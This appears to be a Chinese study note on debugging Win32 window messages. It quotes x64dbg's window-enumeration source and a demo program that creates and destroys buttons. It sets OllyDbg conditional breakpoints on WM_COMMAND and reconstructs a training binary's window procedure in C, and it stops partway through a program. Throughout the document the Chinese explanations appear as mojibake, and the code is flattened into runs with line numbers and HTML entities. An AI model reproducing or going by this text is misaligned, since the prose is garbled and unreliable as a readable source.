mWindowsTable-&gt;setRowCount(count); for(auto i = 0; i &lt; count; i++) &#123; mWindowsTable-&gt;setCellContent(i, 0, ToPtrString(windows[i].wndProc)); mWindowsTable-&gt;setCellContent(i, 1, ToHexString(windows[i].handle)); mWindowsTable-&gt;setCellContent(i, 2, QString(windows[i].windowTitle)); mWindowsTable-&gt;setCellContent(i, 3, QString(windows[i].windowClass)); auto tidStr = QString().sprintf(Config()-&gt;getBool(&quot;Gui&quot;, &quot;PidTidInHex&quot;) ? &quot;%X&quot; : &quot;%u&quot;, windows[i].threadId); char threadName[MAX_THREAD_NAME_SIZE]; if(DbgFunctions()-&gt;ThreadGetName(windows[i].threadId, threadName) &amp;&amp; *threadName != &#x27;\\0&#x27;) mWindowsTable-&gt;setCellContent(i, 4, QString::fromUtf8(threadName) + QString(&quot; (%1)&quot;).arg(tidStr)); else mWindowsTable-&gt;setCellContent(i, 4, tidStr); mWindowsTable-&gt;setCellUserdata(i, 4, windows[i].threadId); //Style mWindowsTable-&gt;setCellContent(i, 5, ToHexString(windows[i].style)); //StyleEx mWindowsTable-&gt;setCellContent(i, 6, ToHexString(windows[i].styleEx)); mWindowsTable-&gt;setCellContent(i, 7, ToHexString(windows[i].parent) + (windows[i].parent == ((duint)GetDesktopWindow()) ? tr(&quot; (Desktop window)&quot;) : &quot;&quot;)); //Size QString sizeText = QString(&quot;(%1,%2);%3x%4&quot;).arg(windows[i].position.left).arg(windows[i].position.top) .arg(windows[i].position.right - windows[i].position.left).arg(windows[i].position.bottom - windows[i].position.top); mWindowsTable-&gt;setCellContent(i, 8, sizeText); mWindowsTable-&gt;setCellContent(i, 9, windows[i].enabled != FALSE ? tr(&quot;Enabled&quot;) : tr(&quot;Disabled&quot;)); mWindowsTable-&gt;setRowIcon(i, getWindowIcon((HWND)windows[i].handle)); &#125; &#125; else mWindowsTable-&gt;setRowCount(0); mWindowsTable-&gt;reloadData(); // refresh values also when in mSearchList mWindowsTable-&gt;refreshSearchList();&#125;è·ŸEnumWindowsï¼Œä¸€å±‚å±‚çœ‹ï¼Œæœ€åæ˜¯çœ‹åˆ°Handles.cppè°ƒç”¨EnumWindows APIæ¥éå†è°ƒè¯•è¿›ç¨‹çš„çª—å£ä¿¡æ¯ï¼ŒgetWindowInfoCallbackæ˜¯å›è°ƒå‡½æ•°Handles.cpp123456789101112131415161718/**\\brief Enumerates the window and return a list of all the windows owned by the debuggee (currently only top level windows)*/bool HandlesEnumWindows(std::vector&lt;WINDOW_INFO&gt; &amp; windowsList)&#123; std::vector&lt;WINDOW_INFO&gt; childWindowsList; EnumWindows(getWindowInfoCallback, (LPARAM)&amp;windowsList); auto i = windowsList.begin(); for(auto i = windowsList.cbegin(); i != windowsList.cend(); ++i) &#123; EnumChildWindows((HWND)i-&gt;handle, getWindowInfoCallback, (LPARAM)&amp;childWindowsList); &#125; for(auto i = childWindowsList.cbegin(); i != childWindowsList.cend(); ++i) &#123; windowsList.push_back(*i); &#125; return true;&#125;Handles.cpp1234567891011static BOOL CALLBACK getWindowInfoCallback(HWND hWnd, LPARAM lParam)&#123; std::vector&lt;WINDOW_INFO&gt;* windowInfo = reinterpret_cast&lt;std::vector&lt;WINDOW_INFO&gt;*&gt;(lParam); DWORD pid = 0; GetWindowThreadProcessId(hWnd, &amp;pid); if(pid == fdProcessInfo-&gt;dwProcessId) &#123; windowInfo-&gt;push_back(getWindowInfo(hWnd)); &#125; return TRUE;&#125;Handles.cpp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/**\\brief Get information about a window*/static WINDOW_INFO getWindowInfo(HWND hWnd)&#123; WINDOW_INFO info; memset(&amp;info, 0, sizeof(info)); if(IsWindow(hWnd) != TRUE) //Not a window &#123; return info; &#125; info.handle = (duint)hWnd; //Get Window Handle GetWindowRect(hWnd, &amp;info.position); //Get Window Rect info.style = GetWindowLong(hWnd, GWL_STYLE); //Get Window Style info.styleEx = GetWindowLong(hWnd, GWL_EXSTYLE); //Get Window Stye ex duint proc1, proc2; proc1 = GetClassLongPtrW(hWnd, GCLP_WNDPROC); proc2 = GetClassLongPtrA(hWnd, GCLP_WNDPROC); if(!DbgMemIsValidReadPtr(proc1)) info.wndProc = proc2; else if(!DbgMemIsValidReadPtr(proc2)) info.wndProc = proc1; else if(IsWindowUnicode(hWnd)) info.wndProc = proc1; else info.wndProc = proc2; if(DbgFunctions()-&gt;ModGetParty(info.wndProc) != 0 || !DbgMemIsValidReadPtr(info.wndProc)) &#123; duint dlgproc1, dlgproc2; dlgproc1 = GetClassLongPtrW(hWnd, DWLP_DLGPROC); dlgproc2 = GetClassLongPtrA(hWnd, DWLP_DLGPROC); if(!DbgMemIsValidReadPtr(dlgproc1)) dlgproc1 = dlgproc2; if(DbgMemIsValidReadPtr(dlgproc1)) &#123; info.wndProc = dlgproc1; &#125; &#125; info.enabled = IsWindowEnabled(hWnd) == TRUE; info.parent = (duint)GetParent(hWnd); //Get Parent Window info.threadId = GetWindowThreadProcessId(hWnd, nullptr); //Get Window Thread Id wchar_t limitedbuffer[256]; limitedbuffer[255] = 0; GetWindowTextW(hWnd, limitedbuffer, 256); if(limitedbuffer[255] != 0) //Window title too long. Add &quot;...&quot; to the end of buffer. &#123; if(limitedbuffer[252] &lt; 0xDC00 || limitedbuffer[252] &gt; 0xDFFF) //protect the last surrogate of UTF-16 surrogate pair limitedbuffer[252] = L&#x27;.&#x27;; limitedbuffer[253] = L&#x27;.&#x27;; limitedbuffer[254] = L&#x27;.&#x27;; limitedbuffer[255] = 0; &#125; auto UTF8WindowTitle = StringUtils::Utf16ToUtf8(limitedbuffer); memcpy(info.windowTitle, UTF8WindowTitle.c_str(), min(UTF8WindowTitle.size(), sizeof(info.windowTitle))); //Copy window title with repect to buffer size constraints GetClassNameW(hWnd, limitedbuffer, 256); if(limitedbuffer[255] != 0) //Window class too long. Add &quot;...&quot; to the end of buffer. &#123; if(limitedbuffer[252] &lt; 0xDC00 || limitedbuffer[252] &gt; 0xDFFF) //protect the last surrogate of UTF-16 surrogate pair limitedbuffer[252] = L&#x27;.&#x27;; limitedbuffer[253] = L&#x27;.&#x27;; limitedbuffer[254] = L&#x27;.&#x27;; limitedbuffer[255] = 0; &#125; UTF8WindowTitle = StringUtils::Utf16ToUtf8(limitedbuffer); memcpy(info.windowClass, UTF8WindowTitle.c_str(), min(UTF8WindowTitle.size(), sizeof(info.windowClass))); //Copy window class with repect to buffer size constraints return info;&#125;æ€»ç»“æ¥è¯´ï¼Œå½“é¼ æ ‡å³é”®ç‚¹å‡»èœå•çš„åˆ·æ–°åã€‚è°ƒç”¨APIï¼ŒEnumWindowså’ŒEnumChildWindowsæ¥éå†è°ƒè¯•è¿›ç¨‹é‡Œæ‰€æœ‰çˆ¶çª—å£å’Œå­çª—å£çš„ä¿¡æ¯ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­è‡ªå·±å†™è¦éå†å“ªäº›ä¿¡æ¯ã€‚å¦å¤–ï¼Œx32dbgä¸­æ²¡çœ‹åˆ°å­çª—å£IDã€‚ä½†æ˜¯ODæœ‰ï¼Œä¸è¿‡èƒ½éå†å‡ºå­çª—å£ï¼Œå­çª—å£IDä¹Ÿä¸éš¾è·å–äº†ã€‚è¿™é‡Œæ²¡å†™éªŒè¯ç¨‹åºéªŒè¯ä¸‹EnumWindowså’ŒEnumChildWindowsï¼Œæœªæ¥é‡åˆ°å†æ·±å…¥çœ‹ä¸‹ã€‚ä½†å…¶å®ä¸€ä¸ªç¨‹åºæ‰€æœ‰çš„å­çª—å£IDæ˜¯å†™æ­»çš„ï¼Œç¼–è¯‘åå°±ç¡®å®šäº†ã€‚ä¹‹æ‰€ä»¥è¦åˆ·æ–°ï¼ŒçŒœæµ‹æ˜¯ï¼šè¿™æ˜¯åŠ¨æ€è°ƒè¯•å™¨ï¼Œä¼šåŠ¨æ€æ˜¾ç¤ºçª—å£çš„ä¿¡æ¯ã€‚å¹¶ä¸”åªæœ‰CreateWindowå‡ºæ¥çš„çª—å£ï¼Œè¿˜æ²¡DestroyWindowæ‰ä¼šæ˜¾ç¤ºåœ¨è°ƒè¯•å™¨çš„çª—å£ä¿¡æ¯ä¸­ï¼Œå¯ä»¥å†™ç¨‹åºéªŒè¯ï¼Œä¸€å¼€å§‹åªæœ‰çˆ¶çª—å£è¢«åˆ›å»ºå‡ºæ¥ï¼Œé¼ æ ‡å·¦é”®ç‚¹å‡»åï¼Œåˆ›å»ºä¸¤ä¸ªå­çª—å£ï¼Œé¼ æ ‡å†ç‚¹ä¸€æ¬¡ï¼Œä¸¤ä¸ªå­çª—å£è¢«é”€æ¯æ ¸å¿ƒä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; case WM_LBUTTONDOWN: if (!g_buttonsCreated) &#123; DbgPrintf(&quot;Creating buttons...&quot;); CreateButton1(hwnd); CreateButton2(hwnd); g_buttonsCreated = TRUE; &#125; else &#123; DbgPrintf(&quot;Destroying buttons...&quot;); DestroyButtons(); g_buttonsCreated = FALSE; &#125; break; // ... [å…¶ä½™caseä¸å˜] ... &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam);&#125;void CreateButton1(HWND hwndParent)&#123; g_hwndButton1 = CreateWindow( TEXT(&quot;button&quot;), // é¢„å®šä¹‰çš„æŒ‰é’®ç±» TEXT(&quot;æŒ‰é’®1&quot;), // æŒ‰é’®ä¸Šçš„æ–‡å­— // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 130, // æŒ‰é’®ä½ç½®ï¼ˆx, yï¼‰ 180, 40, // æŒ‰é’®å¤§å°ï¼ˆå®½åº¦ã€é«˜åº¦ï¼‰ hwndParent, // çˆ¶çª—å£å¥æŸ„ (HMENU)1001, // å­çª—å£ID g_hInstance, // åº”ç”¨ç¨‹åºå®ä¾‹å¥æŸ„ NULL); // æ— é¢å¤–çª—å£æ•°æ® if (g_hwndButton1 == NULL) &#123; DbgPrintf(&quot;åˆ›å»ºæŒ‰é’®å¤±è´¥ï¼Œé”™è¯¯ä»£ç : %d&quot;, GetLastError()); &#125;&#125;void CreateButton2(HWND hwndParent)&#123; g_hwndButton2 = CreateWindow( TEXT(&quot;button&quot;), // é¢„å®šä¹‰çš„æŒ‰é’®ç±» TEXT(&quot;æŒ‰é’®2&quot;), // æŒ‰é’®ä¸Šçš„æ–‡å­— // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 180, // æŒ‰é’®ä½ç½®ï¼ˆx, yï¼‰ 180, 40, // æŒ‰é’®å¤§å°ï¼ˆå®½åº¦ã€é«˜åº¦ï¼‰ hwndParent, // çˆ¶çª—å£å¥æŸ„ (HMENU)1002, // å­çª—å£ID g_hInstance, // åº”ç”¨ç¨‹åºå®ä¾‹å¥æŸ„ NULL); // æ— é¢å¤–çª—å£æ•°æ® if (g_hwndButton2 == NULL) &#123; DbgPrintf(&quot;åˆ›å»ºæŒ‰é’®å¤±è´¥ï¼Œé”™è¯¯ä»£ç : %d&quot;, GetLastError()); &#125;&#125;void DestroyButtons()&#123; if (g_hwndButton1 != NULL) &#123; DestroyWindow(g_hwndButton1); g_hwndButton1 = NULL; DbgPrintf(&quot;Button1 destroyed.&quot;); &#125; if (g_hwndButton2 != NULL) &#123; DestroyWindow(g_hwndButton2); g_hwndButton2 = NULL; DbgPrintf(&quot;Button2 destroyed.&quot;); &#125; InvalidateRect(g_hwndParent, NULL, TRUE); // é‡ç»˜çˆ¶çª—å£åŒºåŸŸ UpdateWindow(g_hwndParent); // ç«‹å³æ›´æ–°çª—å£&#125;å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf#endif LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateButton1(HWND hwnd);void CreateButton2(HWND hwnd);void DestroyButtons();void __cdecl OutputDebugStringF(const char* format, ...);HINSTANCE g_hInstance;HWND g_hwndParent = NULL;HWND g_hwndButton1 = NULL;HWND g_hwndButton2 = NULL;BOOL g_buttonsCreated = FALSE;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; g_hInstance = hInstance; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123;0&#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; g_hwndParent = hWnd; ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ UpdateWindow(hWnd); // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0)) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; case WM_LBUTTONDOWN: if (!g_buttonsCreated) &#123; DbgPrintf(&quot;Creating buttons...&quot;); CreateButton1(hwnd); CreateButton2(hwnd); g_buttonsCreated = TRUE; &#125; else &#123; DbgPrintf(&quot;Destroying buttons...&quot;); DestroyButtons(); g_buttonsCreated = FALSE; &#125; break; // ... [å…¶ä½™caseä¸å˜] ... &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam);&#125;void CreateButton1(HWND hwndParent)&#123; g_hwndButton1 = CreateWindow( TEXT(&quot;button&quot;), // é¢„å®šä¹‰çš„æŒ‰é’®ç±» TEXT(&quot;æŒ‰é’®1&quot;), // æŒ‰é’®ä¸Šçš„æ–‡å­— // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 130, // æŒ‰é’®ä½ç½®ï¼ˆx, yï¼‰ 180, 40, // æŒ‰é’®å¤§å°ï¼ˆå®½åº¦ã€é«˜åº¦ï¼‰ hwndParent, // çˆ¶çª—å£å¥æŸ„ (HMENU)1001, // å­çª—å£ID g_hInstance, // åº”ç”¨ç¨‹åºå®ä¾‹å¥æŸ„ NULL); // æ— é¢å¤–çª—å£æ•°æ® if (g_hwndButton1 == NULL) &#123; DbgPrintf(&quot;åˆ›å»ºæŒ‰é’®å¤±è´¥ï¼Œé”™è¯¯ä»£ç : %d&quot;, GetLastError()); &#125;&#125;void CreateButton2(HWND hwndParent)&#123; g_hwndButton2 = CreateWindow( TEXT(&quot;button&quot;), // é¢„å®šä¹‰çš„æŒ‰é’®ç±» TEXT(&quot;æŒ‰é’®2&quot;), // æŒ‰é’®ä¸Šçš„æ–‡å­— // WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 210, 180, // æŒ‰é’®ä½ç½®ï¼ˆx, yï¼‰ 180, 40, // æŒ‰é’®å¤§å°ï¼ˆå®½åº¦ã€é«˜åº¦ï¼‰ hwndParent, // çˆ¶çª—å£å¥æŸ„ (HMENU)1002, // å­çª—å£ID g_hInstance, // åº”ç”¨ç¨‹åºå®ä¾‹å¥æŸ„ NULL); // æ— é¢å¤–çª—å£æ•°æ® if (g_hwndButton2 == NULL) &#123; DbgPrintf(&quot;åˆ›å»ºæŒ‰é’®å¤±è´¥ï¼Œé”™è¯¯ä»£ç : %d&quot;, GetLastError()); &#125;&#125;void DestroyButtons()&#123; if (g_hwndButton1 != NULL) &#123; DestroyWindow(g_hwndButton1); g_hwndButton1 = NULL; DbgPrintf(&quot;Button1 destroyed.&quot;); &#125; if (g_hwndButton2 != NULL) &#123; DestroyWindow(g_hwndButton2); g_hwndButton2 = NULL; DbgPrintf(&quot;Button2 destroyed.&quot;); &#125; InvalidateRect(g_hwndParent, NULL, TRUE); // é‡ç»˜çˆ¶çª—å£åŒºåŸŸ UpdateWindow(g_hwndParent); // ç«‹å³æ›´æ–°çª—å£&#125;void __cdecl OutputDebugStringF(const char* format, ...)&#123; va_list vlArgs; char* strBuffer = (char*)GlobalAlloc(GPTR, 4096); if (!strBuffer) return; va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, &quot; &quot;); OutputDebugStringA(strBuffer); GlobalFree(strBuffer);&#125;VC++ï¼ŒReleaseç¼–è¯‘ï¼Œæ‹–åˆ°ODæ‰§è¡ŒCreateWindowåˆ›å»ºçˆ¶çª—å£å‰â€œWâ€ç•Œé¢çœ‹ä¸åˆ°ä¿¡æ¯ï¼Œæ‰§è¡Œåçœ‹åˆ°çˆ¶çª—å£çš„ä¿¡æ¯å¯¹å›è°ƒå‡½æ•°ä¸‹æ–­ï¼Œæ·»åŠ æ¡ä»¶[esp+8]==WM_LBUTTONDOWNï¼ŒF9ç¨‹åºè·‘èµ·æ¥åœ¨çˆ¶çª—å£ä¸Šç‚¹é¼ æ ‡å·¦é”®ï¼ˆåˆ›å»ºä¸¤ä¸ªæŒ‰é’®ï¼‰ï¼ŒODæ–­ä¸‹ï¼ŒF9è·‘èµ·æ¥F9æ”¾è¿‡çš„åŸå› ï¼ŒODæ–­ä¸‹æ–­ä¸‹é¼ æ ‡å·¦é”®åï¼Œå¦‚æœå•æ­¥ï¼Œä¼šèµ°DefWindowProcAï¼ˆå› ä¸ºé¼ æ ‡å·¦é”®ç‚¹å‡»è¿˜äº§ç”Ÿäº†å…¶ä»–çš„æ¶ˆæ¯ï¼‰ï¼Œå±äºå¹²æ‰°ä¿¡æ¯äº†ç›´æ¥F9è·‘è¿‡å»ã€‚ç¡¬è¦åˆ†æçš„è¯ï¼Œå®Œæ•´çš„æµç¨‹æ˜¯ï¼šé¼ æ ‡å·¦é”®ç‚¹å‡»ï¼ŒODæ–­ä¸‹CreateButton1-&gt;DefWindowProcA-&gt;CreateButton2-&gt;DefWindowProcAè·Ÿåˆ°0ç¯DefWindowProcAåæ²¡è·Ÿäº†ï¼ŒF9æ”¾è¿‡ï¼Œç„¶åâ€œWâ€ç•Œé¢æ‰ä¼šæœ‰å˜åŒ–æ‰€ä»¥ä¸‹å›¾æ ‡çº¢ï¼ˆæ ‡çº¢è¡¨ç¤ºæ–°å‡ºç°ï¼‰çš„æ˜¯æŒ‰é’®2ï¼Œè€ŒæŒ‰é’®1æ²¡æ ‡çº¢è§‚å¯ŸCreateButtonåâ€œWâ€ç•Œé¢ä¿¡æ¯å˜åŒ–ï¼Œå‘ç°å¤šäº†å­çª—å£çš„å¥æŸ„ä¿¡æ¯å†æ¬¡åœ¨åœ¨çˆ¶çª—å£ä¸Šç‚¹é¼ æ ‡å·¦é”®åœ¨çˆ¶çª—å£ä¸Šç‚¹é¼ æ ‡å·¦é”®ï¼ˆé”€æ¯ä¸¤ä¸ªæŒ‰é’®ï¼‰ï¼ŒODæ–­ä¸‹ï¼ŒF9è·‘èµ·æ¥è§‚å¯ŸCreateButtonåâ€œWâ€ç•Œé¢ä¿¡æ¯å˜åŒ–ï¼Œå‘ç°å­çª—å£çš„å¥æŸ„ä¿¡æ¯æ²¡äº† å‡å¦‚æƒ³æ–­å•é€‰æŒ‰é’®å­çª—å£ï¼Œå†æ·»åŠ æ¡ä»¶[esp+0xC]==0x3EBï¼Œå®Œæ•´çš„æ¡ä»¶æ˜¯ï¼š 1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EB é‚£ä¹ˆå½“å•é€‰æŒ‰é’®å­çª—å£çš„æ¶ˆæ¯è¢«è§¦å‘ï¼ŒODå°±ä¼šæ–­ä¸‹ã€‚ ç»ƒä¹  ç‚¹å‡»çª—å£ä¸Šä¸‰ä¸ªæŒ‰é’®ä¼šå¼¹çª—ï¼Œå¼¹çª—å‰ç¨‹åºåˆ†åˆ«åšäº†ä»€ä¹ˆäº‹ï¼ˆReverseTraining_2.exeï¼‰ åšé¢˜è¿‡ç¨‹æ–­ä¸‹WM_COMMANDåï¼Œè·‘èµ·æ¥ï¼Œç‚¹å‡»â€œWâ€æŒ‰é’®çœ‹çª—å£çš„ä¿¡æ¯éšä¾¿é€‰ä¸ªå­çª—å£æ·»åŠ æ¡ä»¶æ–­ç‚¹Find Me 1æŒ‰é’®1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3E9Find Me 2æŒ‰é’®1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EAFind Me 3æŒ‰é’®1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EBç‚¹å‡»ç›¸åº”å­çª—å£ï¼Œè®©ODæ–­ä¸‹ï¼Œå¼€å§‹åˆ†æ[esp+8]æ˜¯uMsgï¼Œ[esp+0xC]æ˜¯wParamï¼ˆçª—å£IDï¼‰ï¼ŒæŸ¥å¤´æ–‡ä»¶å‘ç°WM_DESTROYå¯¹åº”2ds:[408514]æ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œå› ä¸ºå®ƒä½¿ç”¨ds:[]çš„æ–¹å¼å¯»å€ï¼Œè€Œä¸æ˜¯espæˆ–ebpå¯»å€btwï¼šå½“æ—¶æƒ³0x3E9ï¼Œ0x3EAï¼Œ0x3EBä¸‰ä¸ªcaseæ„æˆè¿ç»­çš„æ¡ä»¶ï¼Œç«Ÿç„¶æ²¡æœ‰ä¼˜åŒ–ã€‚æŸ¥äº†ä¸‹ç¬”è®°ï¼Œåˆ†æ”¯æ•°â‰¤3é‡‡ç”¨æ¨¡æ‹Ÿifâ€¦elseã€‚å¥½å§â•®(â•¯-â•°)â•­è¿˜åŸä¸ºCè¯­è¨€1234567891011121314151617181920212223242526272829303132333435363738394041424344LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; case(WM_COMMAND): &#123; switch (wParam) &#123; case 0x3E9: &#123; MessageBox(NULL, &quot;Find Me 1&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 1; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; case 0x3EA: &#123; MessageBox(NULL, &quot;Find Me 2&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 2; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; case 0x3EB: &#123; MessageBox(NULL, &quot;Find Me 3&quot;, &quot;Demo&quot;, MB_OK | MB_APPLMODAL); *(DWORD*)0x408514 = 3; //ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ return 0; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; &#125; case(WM_DESTROY): &#123; PostQuitMessage(0); return 0; &#125; &#125; //return DefWindowProc(hwnd, uMsg, wParam, lParam); //åº”è¯¥è¿˜éœ€è¦æœ‰è¿™å¥ï¼ˆæ ¹æ®çª—å£ç¨‹åºç¼–å†™ç»éªŒæ¨å¯¼çš„ï¼Œå°†ä¸éœ€è¦çš„æ¶ˆæ¯äº¤ç»™DefWindowProcå¤„ç†ï¼‰ï¼ŒODé‡Œçœ‹æ²¡çœ‹å‡ºè¿™å¥&#125;å†™å®Œæ•´ç¨‹åºçš„éªŒè¯è¿˜åŸçš„Cè¯­è¨€ï¼ŒVC++Releaseç¼–è¯‘ç„¶åæ‹–å…¥ODçœ‹ã€‚é€»è¾‘ä¸Šè¿˜åŸåœ°ä¸€æ ·è¿™æ¬¡switchæŠŠæ¡ä»¶åšä¸€èµ·åˆ¤æ–­äº†éªŒè¯ç¨‹åºçš„å®Œæ•´ä»£ç ä¸‰ä¸ªåˆ›å»ºæŒ‰é’®çš„å‚æ•°ä»exeé‡Œæ‰’çš„123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateThreeButton(HWND hwnd);HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; g_hInstance=hInstance; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123;0&#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPED | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU | WS_THICKFRAME | WS_CAPTION, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® 